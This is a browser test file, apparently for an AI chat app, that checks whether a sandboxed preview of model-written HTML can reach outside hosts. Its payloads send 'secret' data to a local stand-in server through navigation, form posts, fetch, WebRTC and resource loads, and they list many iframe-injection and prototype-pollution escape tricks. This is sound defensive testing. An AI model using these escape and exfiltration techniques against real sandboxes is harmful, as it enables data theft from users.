// The artifact preview sandbox in a real browser (spec §4.1, §9): a page the
// model wrote, trying every way out it has, must reach no host. The test
// serves a parent page with the app's own response CSP (withFrameAncestors)
// that builds the preview INSIDE the browser with the real
// buildSandboxSrcdoc (bundled from source, so withoutNetworkHints runs with a
// real DOMParser) into a frame like SandboxFrame's, and counts every TCP
// connection to a second local "outside" server. Runs in Chromium and
// Firefox (playwright.config.ts).
import http from "node:http";
import net from "node:net";
import type { AddressInfo } from "node:net";
import { fileURLToPath } from "node:url";

import { expect, test, type Page } from "@playwright/test";
import { build } from "esbuild";

import { withFrameAncestors } from "../src/server/frame-ancestors";

let outside: net.Server;
let app: http.Server;
let hits: string[] = [];
let OUT = "";
let APP = "";
let bundle = "";

test.beforeAll(async () => {
  const built = await build({
    entryPoints: [
      fileURLToPath(
        new URL("../src/components/conversation/artifacts/sandbox-srcdoc.ts", import.meta.url),
      ),
    ],
    bundle: true,
    format: "iife",
    globalName: "Sandbox",
    write: false,
  });
  bundle = built.outputFiles[0].text;
  outside = net.createServer((socket) => {
    hits.push("connection");
    socket.on("data", (d) => hits.push(String(d).split("\r\n")[0]));
    socket.on("error", () => undefined);
    setTimeout(() => socket.destroy(), 50);
  });
  await new Promise<void>((r) => outside.listen(0, "127.0.0.1", r));
  OUT = `127.0.0.1:${(outside.address() as AddressInfo).port}`;
  app = http.createServer(async (req, res) => {
    const js = req.url === "/sandbox.js";
    const body = js
      ? bundle
      : "<!doctype html><body><script src='/sandbox.js'></script><script>window.said=[];" +
        'addEventListener("message",e=>said.push(String(e.data)));' +
        'document.addEventListener("securitypolicyviolation",e=>said.push("violation "+e.violatedDirective));' +
        "</script></body>";
    const headed = await withFrameAncestors(
      new Request(`http://localhost${req.url}`),
      new Response(body, {
        headers: { "content-type": js ? "text/javascript" : "text/html; charset=utf-8" },
      }),
      {},
    );
    res.writeHead(200, Object.fromEntries(headed.headers));
    res.end(await headed.text());
  });
  await new Promise<void>((r) => app.listen(0, "localhost", r));
  APP = `http://localhost:${(app.address() as AddressInfo).port}`;
});

test.afterAll(() => {
  app.close();
  outside.close();
});

test.beforeEach(() => {
  hits = [];
});

/** Shows `artifact` the way SandboxFrame does, waits, and returns what the
 *  frame said. */
async function run(page: Page, artifact: string, scripts = true, wait = 1500) {
  await page.goto(`${APP}/`);
  // OC8_SANDBOX_RED=1 builds the srcdoc without GUARD, to see which tests
  // depend on it (a red check that leaves the source alone).
  const red = !!process.env.OC8_SANDBOX_RED;
  await page.evaluate(
    ({ artifact, scripts, red }) => {
      const frame = document.createElement("iframe");
      frame.setAttribute("sandbox", scripts ? "allow-scripts" : "");
      const S = (
        window as unknown as {
          Sandbox: typeof import("../src/components/conversation/artifacts/sandbox-srcdoc");
        }
      ).Sandbox;
      const srcdoc = S.buildSandboxSrcdoc(artifact, undefined, { scripts });
      frame.srcdoc = red ? srcdoc.replace(`<script>${S.GUARD}</script>`, "") : srcdoc;
      document.body.append(frame);
    },
    { artifact, scripts, red },
  );
  await page.waitForTimeout(wait);
  return page.evaluate(() => (window as unknown as { said: string[] }).said);
}

const SAY = 'const say=(m)=>parent.postMessage(String(m),"*");';
/** A nested document that would run without GUARD and connect out. */
const nested = () =>
  `<script>try{const pc=new RTCPeerConnection({iceServers:[{urls:"turn:${OUT}?transport=tcp",username:"u",credential:"c"}]});` +
  `pc.createDataChannel("x");pc.createOffer().then(o=>pc.setLocalDescription(o))}catch(e){}` +
  `try{fetch("http://${OUT}/n").catch(()=>0)}catch(e){}</script>`;
/** `nested()` as a JS string literal inside the artifact's script. */
const nestedJs = () => JSON.stringify(nested()).replace(/<\//g, "<\\/");
/** Reports how many frame-ish elements are left once the page settled. */
const LEFT =
  'setTimeout(()=>say("left "+document.querySelectorAll("iframe,frame,object,embed").length),200);';

test("renders, and the page reaches nothing of the parent", async ({ page }) => {
  const said = await run(
    page,
    `<p id="p">hello</p><script>${SAY}
    const tries=(n,f)=>{try{f();say(n+" OPEN")}catch{say(n+" blocked")}};
    tries("parent.document",()=>parent.document.title);
    tries("top.location",()=>top.location.href);
    tries("localStorage",()=>localStorage.length);
    tries("cookie",()=>document.cookie);
    // Firefox may throw instead of returning null; either is blocked.
    try{say("open "+(window.open("http://${OUT}/popup")===null?"blocked":"OPEN"))}catch{say("open blocked")}
    for (const n of ["fetch","XMLHttpRequest","WebSocket","EventSource","RTCPeerConnection","webkitRTCPeerConnection","RTCDataChannel"]) say(n+" "+typeof window[n]);
    say("sendBeacon "+typeof navigator.sendBeacon);
    try{delete window.fetch;Object.defineProperty(window,"fetch",{value:1})}catch{} say("restored "+typeof window.fetch);
    say("rendered "+document.getElementById("p").textContent);
    </script>`,
  );
  expect(said).toEqual(
    expect.arrayContaining([
      "parent.document blocked",
      "top.location blocked",
      "localStorage blocked",
      "cookie blocked",
      "open blocked",
      "fetch undefined",
      "XMLHttpRequest undefined",
      "WebSocket undefined",
      "EventSource undefined",
      "RTCPeerConnection undefined",
      "webkitRTCPeerConnection undefined",
      "RTCDataChannel undefined",
      "sendBeacon undefined",
      "restored undefined",
      "rendered hello",
    ]),
  );
  expect(page.url()).toMatch(/^http:\/\/localhost/);
  expect(hits).toEqual([]);
});

test("cannot navigate itself to another host", async ({ page }) => {
  for (const [name, how] of [
    ["href", `location.href="http://${OUT}/?d=secret"`],
    ["replace", `location.replace("http://${OUT}/?d=secret")`],
    [
      "refresh",
      `const m=document.createElement("meta");m.httpEquiv="refresh";m.content="0;url=http://${OUT}/?d=secret";document.head.append(m)`,
    ],
    [
      "click",
      `const a=document.createElement("a");a.href="http://${OUT}/?d=secret";document.body.append(a);a.click()`,
    ],
    ["top", `try{top.location="http://${OUT}/?d=secret"}catch{}`],
  ]) {
    await run(page, `<script>setTimeout(()=>{${how}},20)</script>`);
    expect(hits, name).toEqual([]);
    expect(page.url(), name).toMatch(/^http:\/\/localhost/);
  }
  // Markup that would do it before any script: stripped in the parent.
  const said = await run(
    page,
    `<meta http-equiv="refresh" content="0;url=http://${OUT}/?d=1"><base href="http://${OUT}/">` +
      `<script>${SAY}say("metas "+document.querySelectorAll("meta[http-equiv=refresh],base").length)</script>`,
  );
  expect(said).toContain("metas 0");
  expect(hits).toEqual([]);
});

test("strips frames, hints and shadow roots from the markup in the parent", async ({ page }) => {
  const said = await run(
    page,
    `<iframe srcdoc="${nested().replace(/"/g, "&quot;")}"></iframe>` +
      `<div><template shadowrootmode="open"><iframe srcdoc="${nested().replace(/"/g, "&quot;")}"></iframe></template></div>` +
      `<noscript><p title="</noscript><iframe srcdoc='x'></iframe>"></p></noscript>` +
      `<link rel="preconnect" href="http://${OUT}"><link rel="dns-prefetch" href="//${OUT}">` +
      `<script>${SAY}say("links "+document.querySelectorAll("link").length);` +
      `say("shadow "+(document.querySelector("div").shadowRoot===null));${LEFT}</script>`,
  );
  expect(said).toEqual(expect.arrayContaining(["links 0", "shadow true", "left 0"]));
  expect(hits).toEqual([]);
});

// Every way a script can put a frame into the page (sandbox-guard.ts's
// table). Each tries to connect a nested srcdoc; nothing may connect and no
// frame may be left.
const MAKE =
  `const make=()=>{const d=new DOMParser().parseFromString('<iframe></iframe>','text/html');` +
  `const f=document.adoptNode(d.querySelector('iframe'));f.srcdoc=N;return f};`;
const ENTRY_POINTS: Array<[string, string]> = [
  ["createElement", `document.body.appendChild(document.createElement("iframe"))`],
  [
    "createElementNS",
    `document.body.appendChild(document.createElementNS("http://www.w3.org/1999/xhtml","iframe"))`,
  ],
  ["appendChild", `document.body.appendChild(make())`],
  ["insertBefore", `document.body.insertBefore(make(),null)`],
  [
    "replaceChild",
    `const x=document.createElement("p");document.body.append(x);document.body.replaceChild(make(),x)`,
  ],
  ["append", `document.body.append(make())`],
  ["prepend", `document.body.prepend(make())`],
  ["before", `const x=document.createElement("p");document.body.append(x);x.before(make())`],
  ["after", `const x=document.createElement("p");document.body.append(x);x.after(make())`],
  [
    "replaceWith",
    `const x=document.createElement("p");document.body.append(x);x.replaceWith(make())`,
  ],
  [
    "replaceChildren",
    `const x=document.createElement("div");document.body.append(x);x.replaceChildren(make())`,
  ],
  [
    "moveBefore",
    `const x=document.createElement("div");document.body.append(x);x.moveBefore?.(make(),null)`,
  ],
  ["insertAdjacentElement", `document.body.insertAdjacentElement("beforeend",make())`],
  [
    "wrapped in a div",
    `const x=document.createElement("div");x.appendChild?.call;const d=new DOMParser().parseFromString('<div><iframe srcdoc="'+N.replace(/"/g,"&quot;")+'"></iframe></div>','text/html');document.body.append(document.adoptNode(d.body.firstChild))`,
  ],
  [
    "innerHTML",
    `const x=document.createElement("div");document.body.append(x);x.innerHTML='<iframe srcdoc="'+N.replace(/"/g,"&quot;")+'"></iframe>'`,
  ],
  [
    "outerHTML",
    `const x=document.createElement("div");document.body.append(x);x.outerHTML='<iframe srcdoc="'+N.replace(/"/g,"&quot;")+'"></iframe>'`,
  ],
  [
    "insertAdjacentHTML",
    `document.body.insertAdjacentHTML("beforeend",'<iframe srcdoc="'+N.replace(/"/g,"&quot;")+'"></iframe>')`,
  ],
  [
    "Range.insertNode",
    `const r=document.createRange();r.selectNodeContents(document.body);r.insertNode(make())`,
  ],
  [
    "Range.surroundContents",
    `const p=document.createElement("p");p.textContent="x";document.body.append(p);const r=document.createRange();r.selectNodeContents(p);const f=make();r.surroundContents(f)`,
  ],
  [
    "createContextualFragment",
    `const r=document.createRange();r.selectNodeContents(document.body);document.body.append(r.createContextualFragment('<iframe srcdoc="'+N.replace(/"/g,"&quot;")+'"></iframe>'))`,
  ],
  [
    "template.content",
    `const t=document.createElement("template");t.innerHTML='<iframe srcdoc="'+N.replace(/"/g,"&quot;")+'"></iframe>';document.body.append(t.content)`,
  ],
  ["cloneNode", `const f=make();document.body.append(f.cloneNode(true))`],
  [
    "importNode",
    `const d=new DOMParser().parseFromString('<iframe></iframe>','text/html');const f=document.importNode(d.querySelector('iframe'),true);f.srcdoc=N;document.body.append(f)`,
  ],
  [
    "document.body setter",
    `const d=new DOMParser().parseFromString('<body><iframe srcdoc="'+N.replace(/"/g,"&quot;")+'"></iframe></body>','text/html');document.body=document.adoptNode(d.body)`,
  ],
  [
    "document.write",
    `document.write('<div><template shadowrootmode=open><iframe srcdoc="'+N.replace(/"/g,"&quot;")+'"></iframe></template></div>')`,
  ],
  [
    "document.open",
    `document.open();document.write('<iframe srcdoc="'+N.replace(/"/g,"&quot;")+'"></iframe>');document.close()`,
  ],
  [
    "setHTMLUnsafe",
    `document.body.setHTMLUnsafe('<div><template shadowrootmode=open><iframe srcdoc="'+N.replace(/"/g,"&quot;")+'"></iframe></template></div>')`,
  ],
  [
    "parseHTMLUnsafe",
    `const d=Document.parseHTMLUnsafe('<iframe srcdoc="'+N.replace(/"/g,"&quot;")+'"></iframe>');document.body.append(document.adoptNode(d.body))`,
  ],
  [
    "attachShadow",
    `const h=document.createElement("div");document.body.append(h);h.attachShadow({mode:"open"}).append(make())`,
  ],
  [
    "execCommand",
    `document.designMode="on";document.execCommand("insertHTML",false,'<iframe srcdoc="'+N.replace(/"/g,"&quot;")+'"></iframe>')`,
  ],
  [
    "object data",
    `const d=new DOMParser().parseFromString('<object data="data:text/html,x"></object>','text/html');document.body.append(document.adoptNode(d.body.firstChild))`,
  ],
];

for (const [name, how] of ENTRY_POINTS) {
  test(`keeps a nested frame out: ${name}`, async ({ page }) => {
    const said = await run(
      page,
      `<script>${SAY}const N=${nestedJs()};${MAKE}try{${how}}catch(e){say("threw "+e)}${LEFT}</script>`,
    );
    expect(said).toContain("left 0");
    expect(page.frames()).toHaveLength(2);
    expect(hits).toEqual([]);
  });
}

// GUARD keeps working when the page pollutes what it would use.
const POLLUTION: Array<[string, string]> = [
  ["Array iterator", `Array.prototype[Symbol.iterator]=function*(){}`],
  [
    "NodeList iterator",
    `NodeList.prototype[Symbol.iterator]=function*(){};NodeList.prototype.forEach=()=>{}`,
  ],
  ["Element.remove", `Element.prototype.remove=()=>{}`],
  ["removeChild", `Node.prototype.removeChild=function(n){return n}`],
  ["matches", `Element.prototype.matches=()=>false`],
  [
    "querySelectorAll",
    `Element.prototype.querySelectorAll=Document.prototype.querySelectorAll=DocumentFragment.prototype.querySelectorAll=()=>[]`,
  ],
  ["parentNode", `Object.defineProperty(Node.prototype,"parentNode",{get(){return null}})`],
  ["NodeList length", `Object.defineProperty(NodeList.prototype,"length",{get(){return 0}})`],
  ["nodeType", `Object.defineProperty(Node.prototype,"nodeType",{get(){return 3}})`],
  ["addedNodes", `Object.defineProperty(MutationRecord.prototype,"addedNodes",{get(){return []}})`],
  ["MutationObserver", `window.MutationObserver=function(){return {observe(){},disconnect(){}}}`],
  [
    "Reflect.apply",
    `Reflect.apply=()=>undefined;Function.prototype.apply=function(){};Function.prototype.call=function(){}`,
  ],
  [
    "Array index setters",
    `Object.defineProperty(Array.prototype,"0",{set(){},get(){return undefined}})`,
  ],
];

for (const [name, pollute] of POLLUTION) {
  test(`holds under pollution: ${name}`, async ({ page }) => {
    const said = await run(
      page,
      `<script>${SAY}const N=${nestedJs()};${MAKE}try{${pollute}}catch(e){say("pollute failed "+e)}` +
        `const hows=[()=>document.body.appendChild(make()),` +
        `()=>{const x=document.createElement("div");document.body.append(x);x.innerHTML='<iframe srcdoc="'+N.replace(/"/g,"&quot;")+'"></iframe>'},` +
        `()=>{const t=document.createElement("template");t.innerHTML='<iframe srcdoc="'+N.replace(/"/g,"&quot;")+'"></iframe>';document.body.append(t.content)}];` +
        `for (let i=0;i<3;i+=1){try{hows[i]()}catch(e){}}` +
        `setTimeout(()=>{try{say("left "+Document.prototype.querySelectorAll.call(document,"iframe").length)}catch(e){say("left ?")}},200);</script>`,
    );
    expect(said.join("|"), name).not.toMatch(/left [1-9]/);
    // Counted by the browser, whatever the page did to its DOM API.
    expect(page.frames(), name).toHaveLength(2);
    expect(hits, name).toEqual([]);
  });
}

test("drops resource hints and refreshes a script adds or turns on later", async ({ page }) => {
  const said = await run(
    page,
    `<link id="l1" rel="stylesheet" href="data:text/css,p{}"><link id="l2" rel="icon" href="data:,x">` +
      `<link id="l3" rel="icon" href="data:,x"><meta id="m1" name="x" content="y">` +
      `<script>${SAY}
      const t=(f)=>{try{f()}catch(e){}};
      const add=(rel)=>{const l=document.createElement("link");l.rel=rel;l.href="http://${OUT}/"+rel;document.head.append(l)};
      for (const rel of ["dns-prefetch","preconnect","prefetch","prerender","preload","modulepreload"]) t(()=>add(rel));
      t(()=>document.getElementById("l1").setAttribute("rel","preconnect"));
      t(()=>document.getElementById("l2").rel="dns-prefetch");
      t(()=>document.getElementById("l3").relList.add("preconnect"));
      t(()=>{document.getElementById("m1").httpEquiv="refresh"});
      t(()=>{const d=document.createElement("meta");d.setAttribute("http-equiv","x-dns-prefetch-control");d.content="on";document.head.append(d)});
      setTimeout(()=>say("hints "+document.querySelectorAll('link,meta[http-equiv*=refresh i],meta[http-equiv*=prefetch i]').length),200);
      </script>`,
  );
  // One prefetch switch stays: the srcdoc's own, "off".
  expect(said).toContain("hints 1");
  expect(hits).toEqual([]);
});

test("loads nothing through CSS, forms or media", async ({ page }) => {
  await run(
    page,
    `<link rel="stylesheet" href="http://${OUT}/s.css">
    <style>@import url("http://${OUT}/i.css");body{background:url("http://${OUT}/b.png")}
    @font-face{font-family:x;src:url("http://${OUT}/f.woff")}</style><p style="font-family:x">x</p>
    <img src="http://${OUT}/i.png"><video src="http://${OUT}/v.mp4"></video>
    <form id="f" action="http://${OUT}/f" method="post"><input name="q" value="secret"></form>
    <script>document.getElementById("f").submit();new Image().src="http://${OUT}/js.png";</script>`,
  );
  expect(hits).toEqual([]);
});

test("static mode runs no script and still shows the page", async ({ page }) => {
  const said = await run(
    page,
    `<p id="p">static</p><script>parent.postMessage("ran","*")</script>` +
      `<img src="x" onerror="parent.postMessage('handler','*')">`,
    false,
  );
  expect(said).toEqual([]);
  const frame = page.frames()[1];
  expect(await frame.locator("#p").textContent()).toBe("static");
  expect(await page.locator("iframe").getAttribute("sandbox")).toBe("");
  expect(hits).toEqual([]);
});
